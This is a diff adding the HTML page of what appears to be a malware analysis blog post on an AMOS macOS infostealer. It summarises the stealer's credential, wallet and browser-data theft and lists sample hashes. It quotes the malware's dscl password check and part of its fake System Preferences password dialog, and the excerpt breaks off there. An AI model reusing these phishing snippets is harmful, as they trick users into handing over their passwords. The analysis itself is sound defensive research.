@@ -1,0 +1,1902 @@
+<!doctype html>
+<html
+  lang="en-us"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en-us">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>AMOS Infostealer &middot; bubka hacks stuff</title>
+    <meta name="title" content="AMOS Infostealer &middot; bubka hacks stuff">
+  
+
+  
+  
+    <meta name="description" content=" ">
+  
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/investigations/macos-amos/">
+  
+
+  
+  
+    <meta name="author" content="Bubka">
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/investigations/macos-amos/">
+  <meta property="og:site_name" content="bubka hacks stuff">
+  <meta property="og:title" content="AMOS Infostealer">
+  <meta property="og:description" content="TL;DR # The sample is a Go-based variant of Atomic macOS Stealer (AMOS), built as a universal binary for Intel and Apple Silicon. After execution it obtains the user’s password through a fake authentication prompt, collects credentials, cryptocurrency wallets, browser data and documents into an in-memory ZIP archive, sends it via an HTTP POST request to amos-malware[.]ru, and terminates after displaying a fake application error message.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="investigations">
+    <meta property="article:published_time" content="2026-08-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-08-16T00:00:00+00:00">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="AMOS Infostealer">
+  <meta name="twitter:description" content="TL;DR # The sample is a Go-based variant of Atomic macOS Stealer (AMOS), built as a universal binary for Intel and Apple Silicon. After execution it obtains the user’s password through a fake authentication prompt, collects credentials, cryptocurrency wallets, browser data and documents into an in-memory ZIP archive, sends it via an HTTP POST request to amos-malware[.]ru, and terminates after displaying a fake application error message.">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.d967f00ea70373b59d2e652b281aae25ba617fe8a0683814572b1506b8e340a2aef5771c3e1c5cfa7d3fd8c9473f03951361cf514c2831d7355aa3fb749c13a1.css"
+    integrity="sha512-2WfwDqcDc7WdLmUrKBquJbphf&#43;igaDgUVysVBrjjQKKu9XccPhxc&#43;n0/2MlHPwOVE2HPUUwoMdc1WqP7dJwToQ==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.67624a357c928d29b9fe19ba01a1e32c05ad1329ca2a712bf10446df0c6872903d0c14b21f76896b57a5a0710940805416cee38851d9067db6555881188e35a5.js"
+      integrity="sha512-Z2JKNXySjSm5/hm6AaHjLAWtEynKKnEr8QRG3wxocpA9DBSyH3aJa1eloHEJQIBUFs7jiFHZBn22VViBGI41pQ=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "",
+    "name": "AMOS Infostealer",
+    "headline": "AMOS Infostealer",
+    
+    "inLanguage": "en-us",
+    "url" : "http://localhost:1313/investigations/macos-amos/",
+    "author" : {
+      "@type": "Person",
+      "name": "Bubka"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-08-16T00:00:00\u002b00:00",
+    "datePublished": "2026-08-16T00:00:00\u002b00:00",
+    
+    "dateModified": "2026-08-16T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1576"
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl bg-neutral/25 dark:bg-neutral-800/25"></div>
+  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
+    <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      bubka hacks stuff
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/investigations/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="[investigations]"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          [investigations]
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <a
+      href="/blue_team/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="[alert analysis]"
+      title="">
+      
+      
+        <span class="text-base font-medium break-normal">
+          [alert analysis]
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <div class="flex items-center">
+      <button
+        id="appearance-switcher"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base bf-icon-color-hover">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    </div>
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Search (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+    <button
+      id="appearance-switcher-mobile"
+      type="button"
+      aria-label="Dark mode switcher"
+      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
+      <div class="dark:hidden">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+      </div>
+      <div class="hidden dark:block">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+      </div>
+    </button>
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/investigations/"
+        aria-label="[investigations]"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          [investigations]
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/blue_team/"
+        aria-label="[alert analysis]"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="" class="text-2xl font-bold tracking-tight">
+          [alert analysis]
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+  <script>
+    (function () {
+      var mainmenu = document.querySelector(".main-menu");
+      if (!mainmenu) return;
+
+      var path = window.location.pathname;
+      var links = mainmenu.querySelectorAll('a[href="' + path + '"]');
+
+      links.forEach(function (link) {
+        var targets = link.querySelectorAll("span");
+        targets.forEach(function (el) {
+          el.classList.add("active");
+        });
+      });
+    })();
+  </script>
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+  integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+
+
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        AMOS Infostealer
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-08-16T00:00:00&#43;00:00">August 16, 2026</time>
+    
+
+    
+    
+  </div>
+
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+      
+    </div>
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+          
+        
+      
+        
+          
+        
+      
+    </div>
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600 text-sm">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tldr"><span class="hl">TL;DR</span></a></li>
+        <li><a href="#malware-details"><span class="hl">Malware Details</span></a></li>
+        <li><a href="#capabilities"><span class="hl">Capabilities</span></a>
+          <ul>
+            <li><a href="#gui-phishing-prompt"><span>GUI phishing prompt</span></a></li>
+            <li><a href="#keychain-store-theft"><span>Keychain store theft</span></a></li>
+            <li><a href="#cryptocurrency-wallet-data-theft"><span>Cryptocurrency wallet data theft</span></a></li>
+            <li><a href="#browser-data-theft"><span>Browser data theft</span></a></li>
+            <li><a href="#file-collection"><span>File collection</span></a></li>
+            <li><a href="#system-information-collection"><span>System information collection</span></a></li>
+            <li><a href="#exfiltration"><span>Exfiltration</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#attribution"><span class="hl">Attribution</span></a></li>
+        <li><a href="#mitre-attck"><span class="hl">MITRE ATT&amp;CK</span></a></li>
+        <li><a href="#ioc"><span class="hl">IoC</span></a></li>
+        <li><a href="#used-tools"><span class="hl">Used Tools</span></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tldr"><span class="hl">TL;DR</span></a></li>
+        <li><a href="#malware-details"><span class="hl">Malware Details</span></a></li>
+        <li><a href="#capabilities"><span class="hl">Capabilities</span></a>
+          <ul>
+            <li><a href="#gui-phishing-prompt"><span>GUI phishing prompt</span></a></li>
+            <li><a href="#keychain-store-theft"><span>Keychain store theft</span></a></li>
+            <li><a href="#cryptocurrency-wallet-data-theft"><span>Cryptocurrency wallet data theft</span></a></li>
+            <li><a href="#browser-data-theft"><span>Browser data theft</span></a></li>
+            <li><a href="#file-collection"><span>File collection</span></a></li>
+            <li><a href="#system-information-collection"><span>System information collection</span></a></li>
+            <li><a href="#exfiltration"><span>Exfiltration</span></a></li>
+          </ul>
+        </li>
+        <li><a href="#attribution"><span class="hl">Attribution</span></a></li>
+        <li><a href="#mitre-attck"><span class="hl">MITRE ATT&amp;CK</span></a></li>
+        <li><a href="#ioc"><span class="hl">IoC</span></a></li>
+        <li><a href="#used-tools"><span class="hl">Used Tools</span></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+<script>
+  (function () {
+    'use strict'
+
+    const SCROLL_OFFSET_RATIO = 0.33
+    const TOC_SELECTOR = '#TableOfContents'
+    const ANCHOR_SELECTOR = '.anchor'
+    const TOC_LINK_SELECTOR = 'a[href^="#"]'
+    const NESTED_LIST_SELECTOR = 'li ul'
+    const ACTIVE_CLASS = 'active'
+    let isJumpingToAnchor = false
+
+    function getActiveAnchorId(anchors, offsetRatio) {
+      const threshold = window.scrollY + window.innerHeight * offsetRatio
+      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
+      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))
+
+      if (isJumpingToAnchor) {
+        for (let i = 0; i < anchors.length; i++) {
+          const anchor = anchors[i]
+          if (!tocIds.has(anchor.id)) continue
+          const top = anchor.getBoundingClientRect().top + window.scrollY
+          if (Math.abs(window.scrollY - top) < 100) {
+            return anchor.id
+          }
+        }
+      }
+
+      for (let i = anchors.length - 1; i >= 0; i--) {
+        const top = anchors[i].getBoundingClientRect().top + window.scrollY
+        if (top <= threshold && tocIds.has(anchors[i].id)) {
+          return anchors[i].id
+        }
+      }
+      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
+    }
+
+    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
+      const activeId = getActiveAnchorId(anchors, scrollOffset)
+      if (!activeId) return
+
+      links.forEach(link => {
+        const isActive = link.getAttribute('href') === `#${activeId}`
+        link.classList.toggle(ACTIVE_CLASS, isActive)
+
+        if (collapseInactive) {
+          const ul = link.closest('li')?.querySelector('ul')
+          if (ul) ul.style.display = isActive ? '' : 'none'
+        }
+      })
+
+      if (collapseInactive) {
+        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
+        let el = activeLink
+        while (el && el !== toc) {
+          if (el.tagName === 'UL') el.style.display = ''
+          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
+          el = el.parentElement
+        }
+      }
+    }
+
+    function initTOC() {
+      const toc = document.querySelector(TOC_SELECTOR)
+      if (!toc) return
+
+      const collapseInactive = false
+      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
+      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]
+
+      if (collapseInactive) {
+        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
+      }
+
+      links.forEach(link => {
+        link.addEventListener('click', () => {
+          isJumpingToAnchor = true
+        })
+      })
+
+      const config = {
+        toc,
+        anchors,
+        links,
+        scrollOffset: SCROLL_OFFSET_RATIO,
+        collapseInactive
+      }
+
+      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
+      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })
+
+      updateTOC(config)
+    }
+
+    document.readyState === 'loading'
+      ? document.addEventListener('DOMContentLoaded', initTOC)
+      : initTOC()
+  })()
+</script>
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+<h3 class="relative group"><span class="hl">TL;DR</span>
+    <div id="tldr" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#tldr" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>The sample is a Go-based variant of <strong>Atomic macOS Stealer (AMOS)</strong>, built as a
+universal binary for Intel and Apple Silicon. After execution it obtains the
+user&rsquo;s password through a fake authentication prompt, collects credentials,
+cryptocurrency wallets, browser data and documents into an in-memory ZIP archive,
+sends it via an HTTP POST request to <em>amos-malware[.]ru</em>, and terminates after
+displaying a fake application error message.</p>
+<p>Its targets are the Keychain system store, five desktop cryptocurrency wallets
+(Electrum, Coinomi, Exodus, Atomic Wallet, Binance), 54 browser crypto
+extensions, eight browsers (seven Chromium builds and Firefox), and files with
+the extensions .txt, .rtf, .key, .wallet, .private, .secret on the
+desktop and in the documents folder. Combined with the password obtained in the
+first step, the exfiltrated archive allows offline decryption of the Keychain
+container, the Chromium password databases, and wallet seed phrases.</p>
+
+<h3 class="relative group"><span class="hl">Malware Details</span>
+    <div id="malware-details" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#malware-details" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Property</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>File name</td>
+          <td>0dbe84f5c41709e83626385867abcd07a736d3191e39a8f9900882f351c275f1</td>
+      </tr>
+      <tr>
+          <td>MD5</td>
+          <td>c5367f04e9645033db6cda859c29bee7`</td>
+      </tr>
+      <tr>
+          <td>SHA-256</td>
+          <td>0dbe84f5c41709e83626385867abcd07a736d3191e39a8f9900882f351c275f1`</td>
+      </tr>
+      <tr>
+          <td>SSDEEP</td>
+          <td>`98304:jJB2YeVg3JpEkpgy2905PfeYCdgxXFWUw4SjE/j5A1D/3JfYD:1BY6qZ05TGgxMbk1gLc</td>
+      </tr>
+      <tr>
+          <td>Size</td>
+          <td>9.13 MB (9,576,562 bytes)</td>
+      </tr>
+      <tr>
+          <td>Format</td>
+          <td>Mach-O universal binary (x86_64 + arm64)</td>
+      </tr>
+      <tr>
+          <td>Entry point</td>
+          <td>0x106afa0</td>
+      </tr>
+      <tr>
+          <td>Language</td>
+          <td>Go</td>
+      </tr>
+      <tr>
+          <td>Symbols</td>
+          <td>not stripped</td>
+      </tr>
+  </tbody>
+</table>
+
+<h3 class="relative group"><span class="hl">Capabilities</span>
+    <div id="capabilities" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#capabilities" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+
+<h4 class="relative group"><span style="color:red">GUI phishing prompt</span>
+    <div id="gui-phishing-prompt" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#gui-phishing-prompt" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>At the very start the sample obtains the macOS account password by showing the
+user a fake authentication window. First it retrieves the username via
+<code>os.Getenv(&quot;USER&quot;)</code> and then checks whether the account is password-protected
+using the <code>dscl</code> utility:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln">1</span><span class="cl">dscl /Local/Default -authonly &lt;user&gt; &#34;&#34;</span></span></code></pre></div></div>
+<p>If a password is set, a phishing window masquerading as System Preferences is
+displayed.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-applescript" data-lang="applescript"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">display dialog</span> <span class="s2">&#34;MacOS wants to access System Preferences
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s2">%s
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="s2">Please enter your password.&#34;</span> <span class="se">¬
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="k">with</span> <span class="na">title</span> <span class="s2">&#34;System Preferences&#34;</span> <span class="se">¬
